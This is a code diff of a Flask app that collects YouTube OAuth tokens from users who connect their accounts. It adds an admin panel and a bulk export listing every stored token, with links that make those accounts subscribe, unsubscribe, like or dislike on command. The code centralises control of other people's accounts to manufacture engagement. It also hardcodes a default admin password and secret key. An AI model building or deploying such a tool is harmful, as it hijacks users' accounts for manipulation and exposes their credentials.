@@ -10,12 +10,15 @@ from google.oauth2.credentials import Credentials
 from google.auth.transport.requests import Request
 
 app = Flask(__name__)
-app.secret_key = "super_permanent_clean_key_9988_yt"
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_permanent_clean_key_9988_yt")
+
+# Admin Password (Render Environment Variable se le sakta hai ya default 'abhay12345')
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "abhay12345")
 
 # Firebase Database URL
 FIREBASE_URL = "https://luckymall-23b3f-default-rtdb.firebaseio.com"
 
-# Render Redirect URI
+# Render Live Callback URL
 REDIRECT_URI = "https://no-fun-only-money.onrender.com/oauth2callback"
 
 # client_secret.json auto-load
@@ -42,7 +45,7 @@ def firebase_read(path):
         print("Firebase Read Error:", e)
         return None
 
-# --- YOUTUBE URL EXTRACTORS ---
+# --- YOUTUBE HELPERS (URL TO ID PARSING) ---
 def extract_video_id(url_or_id):
     if not url_or_id:
         return None
@@ -63,11 +66,10 @@ def resolve_channel_id(youtube, url_or_id):
     if not url_or_id:
         return None
     url_or_id = url_or_id.strip()
-    # Direct UC... ID (24 characters)
     if url_or_id.startswith('UC') and len(url_or_id) == 24:
         return url_or_id
 
-    # Handle jaise @channelName
+    # Handle jaise @MrBeast
     handle_match = re.search(r'(@[a-zA-Z0-9_.-]+)', url_or_id)
     if handle_match:
         try:
@@ -83,7 +85,7 @@ def resolve_channel_id(youtube, url_or_id):
     if ch_match:
         return ch_match.group(1)
 
-    # Search ke through channel ID nikalna
+    # Search ke zariye channel ID nikalna
     clean_query = url_or_id.replace('https://', '').replace('http://', '').replace('www.youtube.com/', '').replace('/', '')
     try:
         res = youtube.search().list(part="id", type="channel", q=clean_query, maxResults=1).execute()
@@ -95,7 +97,32 @@ def resolve_channel_id(youtube, url_or_id):
 
     return url_or_id
 
-# --- ROUTES ---
+def get_authenticated_service(token):
+    user_creds = firebase_read(f"youtube_tokens/{token}")
+    if not user_creds:
+        return None, "Token invalid hai ya database me nahi mila!"
+
+    creds = Credentials(
+        token=user_creds.get('token'),
+        refresh_token=user_creds.get('refresh_token'),
+        token_uri=user_creds.get('token_uri', 'https://oauth2.googleapis.com/token'),
+        client_id=user_creds.get('client_id'),
+        client_secret=user_creds.get('client_secret'),
+        scopes=user_creds.get('scopes')
+    )
+
+    if creds.expired and creds.refresh_token:
+        try:
+            creds.refresh(Request())
+            user_creds['token'] = creds.token
+            firebase_write(f"youtube_tokens/{token}", user_creds)
+        except Exception as e:
+            return None, f"Token refresh fail hua: {str(e)}"
+
+    youtube = build('youtube', 'v3', credentials=creds)
+    return youtube, None
+
+# --- USER ROUTES ---
 @app.route('/')
 def index():
     token = request.args.get('token') or session.get('my_custom_token')
@@ -142,7 +169,6 @@ def oauth2callback():
 
     custom_token = secrets.token_hex(8)
 
-    # User ka YouTube Profile/Channel Info fetch karein
     creds = Credentials(
         token=token_data.get('access_token'),
         refresh_token=token_data.get('refresh_token'),
@@ -153,7 +179,7 @@ def oauth2callback():
     )
     youtube = build('youtube', 'v3', credentials=creds)
 
-    user_info = {'title': 'Connected User', 'picture': ''}
+    user_info = {'title': 'Connected YouTube Account', 'picture': ''}
     try:
         ch_resp = youtube.channels().list(part="snippet", mine=True).execute()
         if ch_resp.get('items'):
@@ -183,84 +209,106 @@ def logout():
     session.clear()
     return redirect(url_for('index'))
 
-# --- DOWNLOAD SETUP TXT ROUTE ---
-@app.route('/download-setup')
-def download_setup():
-    token = request.args.get('token')
-    if not token:
-        return "Token parameter missing", 400
+# --- ADMIN PANEL ROUTES ---
+@app.route('/admin.html', methods=['GET', 'POST'])
+@app.route('/admin', methods=['GET', 'POST'])
+def admin_panel():
+    error = None
+    if request.method == 'POST':
+        entered_pass = request.form.get('password')
+        if entered_pass == ADMIN_PASSWORD:
+            session['is_admin'] = True
+            return redirect(url_for('admin_panel'))
+        else:
+            error = "Galat Password! Dubara koshish karein."
 
+    if not session.get('is_admin'):
+        return render_template('admin.html', authenticated=False, error=error)
+
+    # Firebase se all tokens read karein
+    all_data = firebase_read("youtube_tokens") or {}
+    token_list = []
+    for t_key, t_val in all_data.items():
+        if isinstance(t_val, dict):
+            u_info = t_val.get('user_info', {})
+            token_list.append({
+                'token': t_key,
+                'name': u_info.get('title', 'Unknown Account'),
+                'picture': u_info.get('picture', '')
+            })
+
+    return render_template('admin.html', authenticated=True, tokens=token_list)
+
+@app.route('/admin-logout')
+def admin_logout():
+    session.pop('is_admin', None)
+    return redirect(url_for('admin_panel'))
+
+# --- DOWNLOAD ALL SETUP TXT (FOR ADMIN) ---
+@app.route('/admin/download-all-setup')
+def download_all_setup():
+    if not session.get('is_admin'):
+        return "Unauthorized Access", 403
+
+    all_data = firebase_read("youtube_tokens") or {}
     base_url = "https://no-fun-only-money.onrender.com/api"
 
-    content = f"""==================================================================
-              YOUTUBE BOT & API AUTOMATION SETUP GUIDE
-==================================================================
+    lines = []
+    lines.append("==================================================================")
+    lines.append("          MASTER YOUTUBE AUTOMATION SETUP & TOKENS DIRECTORY     ")
+    lines.append("==================================================================")
+    lines.append(f"Total Accounts Connected: {len(all_data)}")
+    lines.append(f"Base Request Endpoint: {base_url}\n")
 
-Aapka Permanent Token: {token}
-Base Server API URL: {base_url}
+    lines.append("------------------------------------------------------------------")
+    lines.append("HOW TO USE & URL PARAMETERS GUIDE")
+    lines.append("------------------------------------------------------------------")
+    lines.append("Har URL me ye 3 main cheezein hoti hain:")
+    lines.append("1. token       -> Target account ka unique token")
+    lines.append("2. action      -> subscribe | unsubscribe | like | dislike | search")
+    lines.append("3. channel_url / video_url -> Target YouTube Link\n")
 
-------------------------------------------------------------------
-1. KISI CHANNEL KO SUBSCRIBE KARNE KA SYSTEM:
-------------------------------------------------------------------
-Aap direct YouTube Channel ka koi bhi URL/Link daal sakte hain!
+    lines.append("KAHAN KYA REPLACE KARNA HAI:")
+    lines.append("* Subscribe / Unsubscribe me 'channel_url=' ke aage koi bhi channel link dalein:")
+    lines.append("  Example: https://www.youtube.com/@MrBeast ya https://www.youtube.com/@TSeries")
+    lines.append("* Like / Dislike me 'video_url=' ke aage koi bhi video link dalein:")
+    lines.append("  Example: https://www.youtube.com/watch?v=dQw4w9WgXcQ\n")
 
-URL Format:
-{base_url}?token={token}&action=subscribe&channel_url=[CHANNEL_URL]
+    lines.append("==================================================================")
+    lines.append("ALL REGISTERED ACCOUNTS & READY-TO-USE URLS")
+    lines.append("==================================================================\n")
 
-Ready Example:
-{base_url}?token={token}&action=subscribe&channel_url=https://www.youtube.com/@MrBeast
+    idx = 1
+    for token, details in all_data.items():
+        if not isinstance(details, dict):
+            continue
+        u_info = details.get('user_info', {})
+        acc_name = u_info.get('title', 'Unknown Account')
 
-Kaise use karein aur kahan kya replace karein:
-1. Upar wale link me "[CHANNEL_URL]" ki jagah jis channel ko subscribe karwana hai uska link paste karein (Example: https://youtube.com/@TSeries).
-2. Is pura URL ko kisi bhi phone browser, Chrome me enter karein ya background me hit karein.
-3. Channel instantly aapke account se subscribe ho jayega!
+        lines.append(f"[{idx}] ACCOUNT: {acc_name}")
+        lines.append(f"    TOKEN: {token}")
+        lines.append("    -- ACTION LINKS --")
+        lines.append(f"    1. SUBSCRIBE:")
+        lines.append(f"       {base_url}?token={token}&action=subscribe&channel_url=https://www.youtube.com/@MrBeast")
+        lines.append(f"    2. UNSUBSCRIBE:")
+        lines.append(f"       {base_url}?token={token}&action=unsubscribe&channel_url=https://www.youtube.com/@MrBeast")
+        lines.append(f"    3. LIKE VIDEO:")
+        lines.append(f"       {base_url}?token={token}&action=like&video_url=https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        lines.append(f"    4. DISLIKE VIDEO:")
+        lines.append(f"       {base_url}?token={token}&action=dislike&video_url=https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        lines.append(f"    5. SEARCH:")
+        lines.append(f"       {base_url}?token={token}&action=search&q=technology")
+        lines.append("-" * 66 + "\n")
+        idx += 1
 
-------------------------------------------------------------------
-2. KISI VIDEO KO LIKE KARNE KA SYSTEM:
-------------------------------------------------------------------
-Aap direct YouTube Video ka link daal sakte hain!
-
-URL Format:
-{base_url}?token={token}&action=like&video_url=[VIDEO_URL]
-
-Ready Example:
-{base_url}?token={token}&action=like&video_url=https://www.youtube.com/watch?v=dQw4w9WgXcQ
-
-Kaise use karein:
-1. "[VIDEO_URL]" ki jagah target YouTube video ka link dalein.
-2. Link ko hit ya open karte hi video automatically like ho jayegi.
-
-------------------------------------------------------------------
-3. YOUTUBE SEARCH KARNE KA SYSTEM:
-------------------------------------------------------------------
-URL Format:
-{base_url}?token={token}&action=search&q=[SEARCH_KEYWORD]
-
-Ready Example:
-{base_url}?token={token}&action=search&q=tech+gadgets
-
-------------------------------------------------------------------
-4. APNE PYTHON / PHP YA WEBSITE ME CODE SE KAISE CHALAYEIN:
-------------------------------------------------------------------
-[Python Code Example]
-import requests
-url = "{base_url}?token={token}&action=subscribe&channel_url=https://www.youtube.com/@MrBeast"
-response = requests.get(url)
-print(response.json())
-
-[HTML / Redirect Button Example]
-<a href="{base_url}?token={token}&action=subscribe&channel_url=https://www.youtube.com/@MrBeast">
-   Subscribe MrBeast
-</a>
-==================================================================
-"""
+    content = "\n".join(lines)
     return Response(
         content,
         mimetype="text/plain",
-        headers={"Content-Disposition": f"attachment;filename=setup_instructions_{token[:6]}.txt"}
+        headers={"Content-Disposition": "attachment;filename=ALL_YOUTUBE_TOKENS_SETUP.txt"}
     )
 
-# --- DIRECT URL API HANDLER ---
+# --- MASTER API ENDPOINT ---
 @app.route('/api', methods=['GET', 'POST'])
 def api_handler():
     token = request.args.get('token')
@@ -269,61 +317,66 @@ def api_handler():
     if not token or not action:
         return jsonify({'status': 'error', 'message': 'token aur action parameter zaroori hain!'}), 400
 
-    user_creds = firebase_read(f"youtube_tokens/{token}")
-    if not user_creds:
-        return jsonify({'status': 'error', 'message': 'Token invalid hai ya database me nahi mila!'}), 404
-
-    creds = Credentials(
-        token=user_creds.get('token'),
-        refresh_token=user_creds.get('refresh_token'),
-        token_uri=user_creds.get('token_uri', 'https://oauth2.googleapis.com/token'),
-        client_id=user_creds.get('client_id'),
-        client_secret=user_creds.get('client_secret'),
-        scopes=user_creds.get('scopes')
-    )
-
-    if creds.expired and creds.refresh_token:
-        creds.refresh(Request())
-        user_creds['token'] = creds.token
-        firebase_write(f"youtube_tokens/{token}", user_creds)
-
-    youtube = build('youtube', 'v3', credentials=creds)
+    youtube, err = get_authenticated_service(token)
+    if err:
+        return jsonify({'status': 'error', 'message': err}), 400
 
     try:
-        # Subscribe Action (Direct URL ya Channel ID dono support karta hai)
+        # 1. SUBSCRIBE
         if action == 'subscribe':
             channel_input = request.args.get('channel_url') or request.args.get('channel_id')
             if not channel_input:
-                return jsonify({'status': 'error', 'message': 'channel_url ya channel_id zaroori hai!'}), 400
+                return jsonify({'status': 'error', 'message': 'channel_url parameter missing!'}), 400
 
             target_channel_id = resolve_channel_id(youtube, channel_input)
-            if not target_channel_id:
-                return jsonify({'status': 'error', 'message': 'Channel ID resolve nahi ho payi!'}), 400
-
             youtube.subscriptions().insert(
                 part="snippet",
-                body={
-                    'snippet': {
-                        'resourceId': {
-                            'kind': 'youtube#channel',
-                            'channelId': target_channel_id
-                        }
-                    }
-                }
+                body={'snippet': {'resourceId': {'kind': 'youtube#channel', 'channelId': target_channel_id}}}
             ).execute()
             return jsonify({'status': 'success', 'message': f'Channel ({channel_input}) subscribe ho gaya!', 'channel_id': target_channel_id})
 
-        # Like Action (Direct Video Link ya Video ID dono support karta hai)
+        # 2. UNSUBSCRIBE
+        elif action == 'unsubscribe':
+            channel_input = request.args.get('channel_url') or request.args.get('channel_id')
+            if not channel_input:
+                return jsonify({'status': 'error', 'message': 'channel_url parameter missing!'}), 400
+
+            target_channel_id = resolve_channel_id(youtube, channel_input)
+            sub_res = youtube.subscriptions().list(
+                part="id",
+                mine=True,
+                forChannelId=target_channel_id
+            ).execute()
+
+            items = sub_res.get('items', [])
+            if not items:
+                return jsonify({'status': 'failed', 'message': 'Aapne is channel ko subscribe nahi kiya hua hai!'}), 404
+
+            subscription_id = items[0]['id']
+            youtube.subscriptions().delete(id=subscription_id).execute()
+            return jsonify({'status': 'success', 'message': f'Channel ({channel_input}) unsubscribe ho gaya!'})
+
+        # 3. LIKE VIDEO
         elif action == 'like':
             video_input = request.args.get('video_url') or request.args.get('video_id')
             if not video_input:
-                return jsonify({'status': 'error', 'message': 'video_url ya video_id parameter zaroori hai!'}), 400
+                return jsonify({'status': 'error', 'message': 'video_url parameter missing!'}), 400
 
-            target_video_id = extract_video_id(video_input)
-            youtube.videos().rate(id=target_video_id, rating='like').execute()
-            return jsonify({'status': 'success', 'message': f'Video ({video_input}) like ho gayi!', 'video_id': target_video_id})
+            target_vid = extract_video_id(video_input)
+            youtube.videos().rate(id=target_vid, rating='like').execute()
+            return jsonify({'status': 'success', 'message': f'Video ({video_input}) like ho gayi!', 'video_id': target_vid})
 
-        # Search Action
+        # 4. DISLIKE VIDEO
+        elif action == 'dislike':
+            video_input = request.args.get('video_url') or request.args.get('video_id')
+            if not video_input:
+                return jsonify({'status': 'error', 'message': 'video_url parameter missing!'}), 400
+
+            target_vid = extract_video_id(video_input)
+            youtube.videos().rate(id=target_vid, rating='dislike').execute()
+            return jsonify({'status': 'success', 'message': f'Video ({video_input}) dislike ho gayi!', 'video_id': target_vid})
+
+        # 5. SEARCH
         elif action == 'search':
             query = request.args.get('q', '')
             res = youtube.search().list(part="snippet", q=query, maxResults=5).execute()
